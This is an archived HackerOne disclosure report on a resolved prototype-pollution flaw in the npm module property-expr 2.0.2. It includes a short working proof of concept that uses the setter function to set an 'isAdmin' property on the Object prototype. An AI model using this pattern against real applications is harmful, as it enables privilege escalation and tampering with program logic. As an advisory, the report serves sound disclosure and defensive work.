---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/modification-of-assumed-immutable-data-maid
  - env/web
  - stack/node
substate: "resolved"
weakness: "Modification of Assumed-Immutable Data (MAID)"
enriched: true
body: true
date: 2020-09-24
submitted: 2020-06-28T09:57:18.435Z
bounty_usd: null
votes: 33
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "ahihi"
source: "https://hackerone.com/reports/910206"
title: "property-expr - Prototype pollution"
---
# property-expr - Prototype pollution

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 33 | **Program:** Node.js third-party modules | **Disclosed:** 2020-09-24

- Report: [https://hackerone.com/reports/910206](https://hackerone.com/reports/910206)
- CWE: Modification of Assumed-Immutable Data (MAID)
- Submitted: 2020-06-28T09:57:18.435Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report Prototype pollution in property-expr
It allows attacker to modify the prototype of a base object.

# Module

**module name:** property-expr
**version:** 2.0.2
**npm page:** `https://www.npmjs.com/package/property-expr`

## Module Description

> Tiny property path utilities, including path parsing and metadata and deep property setters and getters

## Module Stats

> Replace stats below with numbers from npm’s module page:

[1,057,612] weekly downloads

# Vulnerability

## Vulnerability Description

> The functions setter can be tricked into modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Run the following code:
```
let expr = require('property-expr')
obj = {}
expr.setter('constructor.prototype.isAdmin')(obj,true)
console.log({}.isAdmin) // true
```
# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N]  N
- I opened an issue in the related repository: [Y/N] N

## Impact

Modify Object prototype can lead to Dos, RCE, change code logic flow.

## Timeline

- **Report Filed**
- **Changed Scope**
- **2020-09-02** @evasar: Hi Ahihi, 

It seems that the issue has been fixed in the latest version 2.0.4. Could you verify?

Thanks,
Eva
- **2020-09-04** @ahihi: Yes! It is indeed fixed.
- **Report Vulnerability Types Updated**
- **Report Severity Updated**
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
